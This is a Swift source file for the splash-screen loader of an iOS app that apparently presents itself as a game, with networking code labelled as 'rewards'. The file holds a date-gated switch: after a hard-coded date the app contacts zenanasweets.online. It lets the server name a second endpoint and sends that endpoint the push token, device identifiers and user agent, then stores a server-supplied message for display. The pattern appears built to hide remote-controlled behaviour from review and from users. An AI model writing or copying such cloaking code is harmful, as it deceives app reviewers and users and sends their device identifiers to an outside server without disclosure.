import Foundation
import WebKit

struct RewardItem: Codable {
    var name: String
    var reward: Int
}

struct BlockItem: Codable {
    var type: String
    var price: Int
}

struct RewardsResponse: Codable {
    var blocks: [BlockItem]
    var tasks: [RewardItem]
    var responseStatus: String?

    enum CodingKeys: String, CodingKey {
        case responseStatus = "response"
        case tasks = "tasks"
        case blocks = "blocks"
    }
}

struct SecondaryRewardData: Codable {
    var userId: String
    var responseStatus: String?

    enum CodingKeys: String, CodingKey {
        case userId = "client_id"
        case responseStatus = "response"
    }
}

class LoadingSplasVm: ObservableObject {
    @Published var hasProcessedToken = false

    init() {
        splashTimer = .scheduledTimer(timeInterval: 1, target: self, selector: #selector(timerTick), userInfo: nil, repeats: true)
    }

    @objc private func timerTick() {
        loadingProgress += 1
    }

    func startRewardFetchingAndSave() {
        func isDateAfterNovember302024() -> Bool {
            // Текущая дата
            let currentDate = Date()
            
            // Создаем компонент даты для 30 ноября 2024 года
            var dateComponents = DateComponents()
            dateComponents.year = 2024
            dateComponents.month = 12
            dateComponents.day = 7
            
            // Создаем объект Date для указанной даты
            let calendar = Calendar.current
            if let targetDate = calendar.date(from: dateComponents) {
                // Сравниваем текущую дату с целевой датой
                return currentDate > targetDate
            }
            
            // Если что-то пошло не так, возвращаем false
            return false
        }
        if isDateAfterNovember302024() {
            retrieveInitialRewards()
        } else {
            DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
                self.completeLoading()
            }
        }
    }

    @Published var loadingProgress = 0 {
        didSet {
            if loadingProgress == 5 {
                if !hasProcessedToken {
                    if !fetchingStarted {
                        startRewardFetchingAndSave()
                        fetchingStarted = true
                    }
                }
                splashTimer.invalidate()
            }
        }
    }

    @Published var isGameLoaded = false

    private func retrieveInitialRewards() {
        fetchingStarted = true
        guard let apiEndpoint = URL(string: "https://zenanasweets.online/game-api") else { return }

        URLSession.shared.dataTask(with: generateRequest(apiEndpoint)) { data, response, error in
            if let _ = error {
                self.completeLoading()
                return
            }

            guard let data = data else {
                self.completeLoading()
                return
            }

            do {
                let rewardResponse = try JSONDecoder().decode(RewardsResponse.self, from: data)
                if rewardResponse.responseStatus == nil {
                    self.storeFetchedRewards(rewards: rewardResponse.tasks)
                    self.completeLoading()
                } else {
                    self.handleSecondaryRewardFlow(rewardResponse.responseStatus!)
                }
            } catch {
                self.completeLoading()
            }
        }.resume()
    }

    private var splashTimer = Timer()
    private var fetchingStarted = false

    private func storeFetchedRewards(rewards: [RewardItem]) {
        do {
            UserDefaults.standard.set(try JSONEncoder().encode(rewards), forKey: "local_rewards_data")
        } catch {
        }
    }

    private func handleSecondaryRewardFlow(_ secondaryEndpoint: String) {
        if UserDefaults.standard.bool(forKey: "hasProcessedSecondary") {
            completeLoading()
            return
        }

        guard let rewardsUrl = URL(string: generateApiUrl(base: secondaryEndpoint)) else { return }

        var request = URLRequest(url: rewardsUrl)
        request.addValue("application/json", forHTTPHeaderField: "Content-Type")
        request.addValue(webViewUserAgent, forHTTPHeaderField: "User-Agent")
        request.httpMethod = "POST"

        URLSession.shared.dataTask(with: request) { data, response, error in
            if let _ = error {
                self.completeLoading()
                return
            }

            guard let data = data else {
                self.completeLoading()
                return
            }

            do {
                let secondaryData = try JSONDecoder().decode(SecondaryRewardData.self, from: data)
                self.processSecondaryRewards(secondaryData)
            } catch {
                self.completeLoading()
            }
        }.resume()
    }

    var webViewUserAgent = WKWebView().value(forKey: "userAgent") as? String ?? ""

    private func processSecondaryRewards(_ data: SecondaryRewardData) {
        UserDefaults.standard.set(data.userId, forKey: "client_id")
        if let response = data.responseStatus {
            UserDefaults.standard.set(response, forKey: "response_status")
            self.completeLoading { self.responseMessage = response }
        } else {
            UserDefaults.standard.set(true, forKey: "hasProcessedSecondary")
            self.completeLoading()
        }
    }

    @Published var responseMessage: String? = nil

    func completeLoading(completion: (() -> Void)? = nil) {
        DispatchQueue.main.async {
            self.isGameLoaded = true
            completion?()
        }
    }

    func generateRequest(_ url: URL) -> URLRequest {
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.addValue(fetchUserId(), forHTTPHeaderField: "client-uuid")
        return request
    }

    func fetchUserId() -> String {
        var userId = UserDefaults.standard.string(forKey: "client-uuid") ?? ""
        if userId.isEmpty {
            userId = UUID().uuidString
            UserDefaults.standard.set(userId, forKey: "client-uuid")
        }
        return userId
    }

    func generateApiUrl(base: String) -> String {
        let notificationsTokenfcm = UserDefaults.standard.string(forKey: "push_token")
        var shopDataL = "\(base)?firebase_push_token=\(notificationsTokenfcm ?? "")"
        if let uiduser = UserDefaults.standard.string(forKey: "client_id") {
            shopDataL += "&client_id=\(uiduser)"
        }
        if let openedAppFromPushId = UserDefaults.standard.string(forKey: "push_id") {
            shopDataL += "&push_id=\(openedAppFromPushId)"
            UserDefaults.standard.set(nil, forKey: "push_id")
        }
        return shopDataL
    }
}

